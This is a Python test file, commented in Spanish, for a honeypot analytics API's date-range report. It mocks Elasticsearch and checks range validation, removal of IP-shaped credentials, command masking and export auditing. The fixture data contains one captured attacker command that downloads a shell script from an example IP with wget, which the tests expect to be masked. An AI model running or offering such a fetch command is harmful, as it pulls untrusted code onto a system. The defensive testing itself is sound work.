"""El reporte general por rango, sin Elasticsearch.

Lo que se fija: que el rango se valide antes de llegar a la consulta, que una credencial con forma
de dirección no salga en el reporte aunque esté entre las más probadas, que los comandos lleguen
tapados, y que cada exportación quede en la auditoría con su rango.
"""

from __future__ import annotations

from typing import Any

import pytest
from fastapi.testclient import TestClient

from honeyml.api import reporte
from honeyml.api.main import app


def _cubos(*pares: tuple[str, int]) -> dict[str, Any]:
    return {"buckets": [{"key": k, "doc_count": n} for k, n in pares]}


def _credenciales(*trios: tuple[str, int, int]) -> dict[str, Any]:
    """Cubos de credenciales: clave, intentos y cuántas direcciones distintas la probaron."""
    return {"buckets": [{"key": k, "doc_count": n, "origenes": {"value": o}} for k, n, o in trios]}


RESPUESTA = {
    "hits": {"total": {"value": 1200}},
    "aggregations": {
        "sensores": _cubos(("cowrie", 900), ("dionaea", 300)),
        "logins": {"doc_count": 500},
        "logins_ok": {"doc_count": 40},
        "comandos": {"doc_count": 70},
        "ventana": {
            "min_as_string": "2026-10-01T00:00:00Z",
            "max_as_string": "2026-10-02T23:00:00Z",
        },
        "por_dia": {
            "buckets": [
                {
                    "key_as_string": "2026-10-01T00:00:00.000Z",
                    "doc_count": 700,
                    "logins": {"doc_count": 300},
                },
                {
                    "key_as_string": "2026-10-02T00:00:00.000Z",
                    "doc_count": 500,
                    "logins": {"doc_count": 200},
                },
            ]
        },
        "por_hora": {
            "buckets": [
                {"key_as_string": "2026-10-01T03:00:00.000Z", "doc_count": 10},
                {"key_as_string": "2026-10-02T03:00:00.000Z", "doc_count": 5},
            ]
        },
        "protocolos": {"buckets": [{"key": "ssh", "doc_count": 900, "ips": {"value": 80}}]},
        "categorias": _cubos(("authentication", 500)),
        "paises": {
            "buckets": [
                {
                    "key": "Brazil",
                    "doc_count": 300,
                    "ips": {"value": 20},
                    "iso": _cubos(("BR", 300)),
                    "centro": {"location": {"lat": -10.0, "lon": -50.0}},
                }
            ]
        },
        "con_geo": {"doc_count": 1100},
        "sistemas": {"buckets": [{"key": "Red de prueba", "doc_count": 200, "ips": {"value": 9}}]},
        "usuarios": _credenciales(
            ("root", 300, 120), ("203.0.113.9", 40, 30), ("admin", 20, 9), ("cuenta.puntual", 15, 1)
        ),
        "contrasenas": _credenciales(("123456", 90, 50), ("192.0.2", 10, 8)),
        "comandos_top": _cubos(("wget http://198.51.100.7/x.sh", 12)),
    },
}


@pytest.fixture
def sin_elastic(monkeypatch: pytest.MonkeyPatch) -> list[dict[str, Any]]:
    pedidos: list[dict[str, Any]] = []

    def buscar(cuerpo: dict[str, Any], *_: Any, **__: Any) -> dict[str, Any]:
        pedidos.append(cuerpo)
        return RESPUESTA

    monkeypatch.setattr(reporte.queries, "_search", buscar)
    monkeypatch.setattr(reporte.queries, "_direcciones_exactas", lambda *_: 101)
    monkeypatch.setattr(reporte, "_buscar", lambda *_: None)
    reporte._recordados.clear()
    return pedidos


@pytest.mark.parametrize(
    ("desde", "hasta"),
    [
        ("2026-13-01", None),
        ("01/10/2026", None),
        ("2026-10-08", "2026-10-01"),
        ("2026-10-01T00", None),
    ],
)
def test_un_rango_mal_formado_no_llega_a_la_consulta(desde: str, hasta: str | None) -> None:
    with pytest.raises(reporte.RangoInvalidoError):
        reporte.validar(desde, hasta)


def test_el_reporte_no_lleva_direcciones(sin_elastic: list[dict[str, Any]]) -> None:
    datos = reporte.general("2026-10-01", "2026-10-02")
    captura = datos["captura"]
    assert [u["key"] for u in captura["usuarios"]] == ["root", "admin"]
    assert [c["key"] for c in captura["contrasenas"]] == ["123456"]
    assert captura["comandos"][0]["key"] == "wget http://tapado/x.sh"
    assert captura["unique_ips"] == 101
    assert captura["por_hora"][3] == 15
    rango = sin_elastic[0]["query"]["bool"]["must"]
    assert {
        "range": {"@timestamp": {"gte": "2026-10-01T00:00:00Z", "lte": "2026-10-02T23:59:59.999Z"}}
    } in rango


def test_el_mismo_rango_se_recuerda(sin_elastic: list[dict[str, Any]]) -> None:
    reporte.general("2026-10-01", "2026-10-02")
    reporte.general("2026-10-01", "2026-10-02")
    assert len(sin_elastic) == 1


def test_cada_exportacion_queda_con_su_rango(
    como_invitado: list[dict[str, Any]], sin_elastic: list[dict[str, Any]]
) -> None:
    cliente = TestClient(app)
    assert cliente.get("/api/reporte?desde=2026-10-01&hasta=2026-10-02").status_code == 200
    assert cliente.get("/api/reporte?desde=2026-10-09&hasta=2026-10-02").status_code == 422
    aviso = {"formato": "csv", "conjunto": "paises", "desde": "2026-10-01", "hasta": "2026-10-02"}
    assert cliente.post("/api/reporte", json=aviso).status_code == 200
    anotado = como_invitado[-1]
    assert anotado["accion"] == "exportacion"
    assert anotado["objetivo"] == "paises"
    assert anotado["detalle"]["desde"] == "2026-10-01"
